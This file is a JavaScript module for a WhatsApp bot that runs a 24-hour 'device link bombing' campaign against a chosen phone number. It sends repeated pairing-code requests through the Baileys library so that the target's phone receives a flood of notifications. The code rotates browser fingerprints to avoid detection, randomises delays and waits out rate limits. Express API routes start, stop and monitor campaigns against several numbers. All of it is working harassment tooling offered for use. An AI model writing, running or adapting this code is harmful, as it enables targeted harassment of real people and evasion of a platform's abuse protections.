// ============================================================
// MODULE: spampair.js
// WhatsApp Bot command: .spampair <phone_number>
// Starts a 24-hour device link bombing campaign against the target
// ============================================================

const express = require('express');
const crypto = require('crypto');
const EventEmitter = require('events');

// ---------- CONFIGURATION ----------
const DEFAULT_DURATION_HOURS = 24;
const REQUEST_DELAY_MIN_MS = 10000;
const REQUEST_DELAY_MAX_MS = 16000;
// Browser fingerprints to rotate between (avoids fingerprint-based blocking)
const SPAM_BROWSERS = [
  ['Ubuntu', 'Chrome'],
  ['Windows', 'Chrome'],
  ['Mac OS', 'Safari'],
  ['Windows', 'Edge'],
  ['Android', 'Chrome'],
];

// ---------- STATE ----------
const activeCampaigns = new Map(); // phone -> { spamPair, stopFlag, stats, startTime }

class SpamPair extends EventEmitter {
  constructor(phoneNumber, durationHours = DEFAULT_DURATION_HOURS) {
    super();
    this.phone = this._formatNumber(phoneNumber);
    this.durationMs = durationHours * 60 * 60 * 1000;
    this.stopFlag = false;
    this.stats = { attempts: 0, success: 0, errors: 0 };
    this.sessionId = crypto.randomBytes(8).toString('hex');
    this._runLoop = this._runLoop.bind(this);
    this._timer = null;
    this._baileys = null; // lazy-loaded
    this._browser = null; // lazy-loaded
  }

  // ---------- UTILITIES ----------
  _formatNumber(num) {
    let clean = String(num || '').replace(/\D/g, '');
    if (!clean.startsWith('91')) clean = '91' + clean;
    return clean;
  }

  _randomDelay() {
    return Math.floor(Math.random() * (REQUEST_DELAY_MAX_MS - REQUEST_DELAY_MIN_MS + 1)) + REQUEST_DELAY_MIN_MS;
  }

  // ---------- SLEEP HELPER ----------
  _sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

  // ---------- LAZY LOAD BAILEYS ----------
  _ensureBaileys() {
    if (!this._baileys) {
      try {
        const baileys = require("@whiskeysockets/baileys");
        const { default: makeWASocket, initAuthCreds, DisconnectReason, makeCacheableSignalKeyStore, fetchLatestBaileysVersion, Browsers } = baileys;
        this._baileys = { makeWASocket, initAuthCreds, DisconnectReason, makeCacheableSignalKeyStore, fetchLatestBaileysVersion, Browsers };
        this._browser = Browsers?.ubuntu('Chrome');
      } catch (_be) {
        throw new Error('Baileys library not available in this environment');
      }
    }
    return this._baileys;
  }

  // ---------- CORE ATTEMPT — uses baileys WebSocket to trigger real pairing notification ----------
  async _attemptLink() {
    let sock = null;
    let _onConnUpdate = null;
    try {
      const { makeWASocket, initAuthCreds, DisconnectReason, makeCacheableSignalKeyStore, fetchLatestBaileysVersion, Browsers } = this._ensureBaileys();

      // Rotate browser fingerprint to avoid detection
      const _bIdx = (this.stats.attempts || 0) % SPAM_BROWSERS.length;
      const _bCfg = SPAM_BROWSERS[_bIdx];
      const _browser = Browsers[_bCfg[1]]?.(_bCfg[0]) || Browsers.ubuntu('Chrome');

      // Create ephemeral in-memory auth credentials
      const authCreds = initAuthCreds();
      const state = {
        creds: authCreds,
        keys: { get: async () => null, set: async () => {}, delete: async () => {} }
      };

      const { version } = await fetchLatestBaileysVersion();

      // Promise that resolves when noise handshake completes OR rejects on error/disconnect
      let _connected = false;
      let _connErr = null;
      _onConnUpdate = (update) => {
        if (update.connection === 'open') {
          _connected = true;
        }
        if (update.lastDisconnect?.error) {
          _connErr = update.lastDisconnect.error;
        }
      };

      // Create socket — baileys handles WebSocket connect + noise handshake internally
      sock = makeWASocket({
        version,
        browser: _browser,
        auth: {
          creds: state.creds,
          keys: state.keys
        },
        generateHighQualityLinkPreview: false,
        shouldSyncHistoryMessage: () => false,
        getMessage: async () => undefined,
        connectTimeoutMs: 15000,
        defaultQueryTimeoutMs: 15000,
        logger: { info: () => {}, warn: () => {}, error: () => {}, trace: () => {}, debug: () => {}, child: () => ({ info: () => {}, warn: () => {}, error: () => {}, trace: () => {}, debug: () => {} }) }
      });

      sock.ev.on('connection.update', _onConnUpdate);

      // Wait for noise handshake (up to 18s) — unlike the comment in the old code,
      // 'connection:open' DOES fire for unregistered sockets once noise handshake completes.
      // The old 4s fixed wait + ws.isOpen was insufficient.
      const _waitStart = Date.now();
      while (!_connected && !_connErr && (Date.now() - _waitStart) < 18000) {
        await this._sleep(500);
      }
      if (_connErr) throw _connErr;
      if (!_connected) throw new Error(`Noise handshake not completed after 18s`);

      // Small extra pause after connection:open so initial server stanzas can arrive
      await this._sleep(1500);

      // Request pairing code — this sends the actual WhatsApp XML stanza
      // that triggers a push notification to the target phone
      const code = await sock.requestPairingCode(this.phone);

      this.stats.attempts++;
      this.stats.success++;
      return true;

    } catch (error) {
      this.stats.attempts++;
      this.stats.errors++;
      const errMsg = String(error?.message || error || 'Unknown').slice(0, 200);

      // Only emit rate-limit events — don't spam the user with every failed attempt
      if (errMsg.includes('429') || errMsg.includes('rate-overlimit') || errMsg.includes('too-fast')) {
        this.emit('rate-limit', { phone: this.phone, detail: errMsg });
        await this._sleep(45000);
      } else if (errMsg.includes('not connected') || errMsg.includes('connect') || errMsg.includes('handshake')) {
        await this._sleep(15000);
      } else if (errMsg.includes('timeout')) {
        await this._sleep(20000);
      }

      return false;
    } finally {
      if (sock) {
        if (_onConnUpdate) { try { sock.ev?.off('connection.update', _onConnUpdate); } catch (_) {} }
        try { sock.end(new Error('SpamPair: cleanup')); } catch (_) {}
      }
    }
  }

  // ---------- MAIN LOOP ----------
  async _runLoop() {
    const startTime = Date.now();
    this.emit('start', { phone: this.phone, duration: this.durationMs });

    while (!this.stopFlag && (Date.now() - startTime) < this.durationMs) {
      const success = await this._attemptLink();
      
      // Emit progress every 10 attempts
      if (this.stats.attempts % 10 === 0) {
        this.emit('progress', {
          phone: this.phone,
          attempts: this.stats.attempts,
          success: this.stats.success,
          errors: this.stats.errors,
          elapsed: Math.round((Date.now() - startTime) / 1000)
        });
      }

      // Random delay between attempts
      await this._sleep(this._randomDelay());

      // Refresh session occasionally
      if (this.stats.attempts % 50 === 0) {
        this.sessionId = crypto.randomBytes(8).toString('hex');
      }
    }

    this.emit('done', {
      phone: this.phone,
      totalAttempts: this.stats.attempts,
      totalSuccess: this.stats.success,
      totalErrors: this.stats.errors,
      durationSeconds: Math.round((Date.now() - startTime) / 1000)
    });
  }

  // ---------- START / STOP ----------
  start() {
    if (this._timer) {
      this.emit('error', { phone: this.phone, message: 'Already running' });
      return;
    }
    this.stopFlag = false;
    this._runLoop().catch(err => this.emit('error', { phone: this.phone, error: err.message }));
    return this;
  }

  stop() {
    this.stopFlag = true;
    this.emit('stopped', { phone: this.phone, stats: this.stats });
    return this;
  }

  getStats() {
    return { phone: this.phone, ...this.stats, running: !this.stopFlag };
  }
}

// ================================================================
// EXPRESS API ROUTES
// ================================================================

const router = express.Router();

// ── POST /api/spampair/start ──────────────────────────────────────
// Body: { phoneNumber }
router.post('/start', (req, res) => {
  const phoneNumber = String(req.body.phoneNumber || '').trim();
  if (!phoneNumber) {
    return res.status(400).json({ error: 'Missing phoneNumber' });
  }

  const cleanNumber = phoneNumber.replace(/\D/g, '');
  if (activeCampaigns.has(cleanNumber)) {
    const campaign = activeCampaigns.get(cleanNumber);
    return res.json({
      status: 'already_running',
      phone: cleanNumber,
      stats: campaign.stats
    });
  }

  const campaign = new SpamPair(phoneNumber);
  activeCampaigns.set(cleanNumber, {
    spamPair: campaign,
    stats: campaign.stats,
    startTime: Date.now()
  });

  // Start the campaign (events are handled by case.js)
  campaign.start();

  res.json({
    status: 'started',
    phone: cleanNumber,
    sessionId: campaign.sessionId,
    durationHours: DEFAULT_DURATION_HOURS
  });
});

// ── POST /api/spampair/stop ───────────────────────────────────────
// Body: { phoneNumber }
router.post('/stop', (req, res) => {
  const phoneNumber = String(req.body.phoneNumber || '').trim();
  if (!phoneNumber) {
    return res.status(400).json({ error: 'Missing phoneNumber' });
  }

  const cleanNumber = phoneNumber.replace(/\D/g, '');
  if (!activeCampaigns.has(cleanNumber)) {
    return res.status(404).json({ error: 'No active campaign for this number', phone: cleanNumber });
  }

  const entry = activeCampaigns.get(cleanNumber);
  entry.spamPair.stop();
  activeCampaigns.delete(cleanNumber);

  res.json({
    status: 'stopped',
    phone: cleanNumber,
    stats: entry.stats
  });
});

// ── GET /api/spampair/status ──────────────────────────────────────
router.get('/status', (req, res) => {
  if (activeCampaigns.size === 0) {
    return res.json({ campaigns: [] });
  }

  const campaigns = [];
  for (const [phone, entry] of activeCampaigns) {
    campaigns.push({
      phone,
      stats: entry.spamPair.getStats(),
      running: !entry.spamPair.stopFlag,
      startedAt: entry.startTime
    });
  }
  res.json({ campaigns });
});

module.exports = router;
module.exports.SpamPair = SpamPair;
module.exports.activeCampaigns = activeCampaigns;
